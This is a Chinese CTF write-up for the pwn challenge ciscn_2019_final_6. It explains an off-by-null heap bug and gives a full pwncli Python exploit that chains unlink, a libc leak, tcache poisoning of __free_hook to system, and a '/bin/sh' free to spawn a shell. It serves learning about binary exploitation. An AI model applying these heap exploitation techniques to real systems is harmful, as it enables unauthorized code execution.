# ciscn_2019_final_6



### 总结

表面看是迷宫，其实是一道`off by null`的题目。在已知指针数组情况下的`off by null`，一般来说用`unlink`是最快最有效的。

<!-- more -->

### checksec

![image-20220304204739873](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220304204739873.png)

给的`libc`是`2.23`的，远程的是`2.27`。

### 漏洞点

在`read_input`函数中：

![image-20220304204942575](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220304204942575.png)

主要在`store`中使用了：

![image-20220304205016086](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220304205016086.png)

### 利用思路

恢复一下结构体：

```c
struct Mazes{
int start_x;
int start_y;
int step;
char *name;
};
```

结合漏洞，利用思路为：

- 利用`store`构造`off by null`
- 使用`unlink`构造重叠的堆
- 利用`resume`泄露出`libc`地址
- 使用`tcache bin poisoning`劫持`__free_hook`为`system`地址
- 释放`/bin/sh`块

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

elf: ELF = gift['elf']
libc: ELF = gift['libc']


def resume(size = 0, data=""):
    sla("> ", "0")
    m = rls(b"hello")
    m2 = rls("X:")
    sla("input you ops count\n", str(size))
    if size > 0:
        sa("ops: ", data)
    log_ex(f"Get msg: {m}")
    log_ex(f"Get msg: {m2}")
    return m, m2

def new(name="roderick", data=""):
    sla("> ", "1")
    sla("what's your name?\n", name)
    m = rls(b"hello")
    sla("input you ops count\n", str(len(data)))
    if len(data) > 0:
        sa("ops: ", data)
    log_ex(f"Get msg: {m}")
    return m

def load(idx, data):
    sla("> ", "2")
    sla("index?\n", str(idx))
    m = rls(b"hello")
    sla("input you ops count\n", str(len(data)))
    if len(data) > 0:
        sa("ops: ", data)
    log_ex(f"Get msg: {m}")
    return m

def store(size, data, yes= "y"):
    sla("> ", "3")
    sa("any comment?\n", yes)
    if yes == "y":
        sla("comment size?\n", str(size))
        sa("plz input comment\n", data)


def dele(idx):
    sla("> ", "4")
    sla("index?\n", str(idx))

new()
store(0x420, "deadbeef\n")
new()
store(0x38, "deadbeef\n")

dele(1)
new()
store(0x4f0, "deadbeef\n")

new()
# off by null
store(0x38, 0x30 * b"a" + p64(0x4c0))

dele(0)
dele(1) # unlink

new()
resume(0x420, "deadbeef")


_, m = resume(0)
res = m.split()

# leak libc addr
l = int(res[0][2:-1].decode()) & 0xffffffff
h = int(res[1][2:-1].decode()) & 0xffffffff

libc_addr = (h << 32) + l - 0x3ebca0
log_libc_base_addr(libc_addr)
libc.address = libc_addr

# tcache bin poisoning
resume(0x470, flat({
    0x420:{
        0: [0, 0x51]
    }
    }))
store(0, "", "n")
dele(0)

new()
resume(0x470, flat({
    0x420:{
        0: [0, 0x51, libc.sym['__free_hook']]
    }
    }))

store(0x40, "/bin/sh\x00\n")

new()

store(0x40, p64(libc.sym.system)+b"\n")

dele(0)

get_current_flag_when_get_shell()

ia()

```

![image-20220304205511227](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220304205511227.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)


---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2022-03-04-ciscn-2019-final-6/  

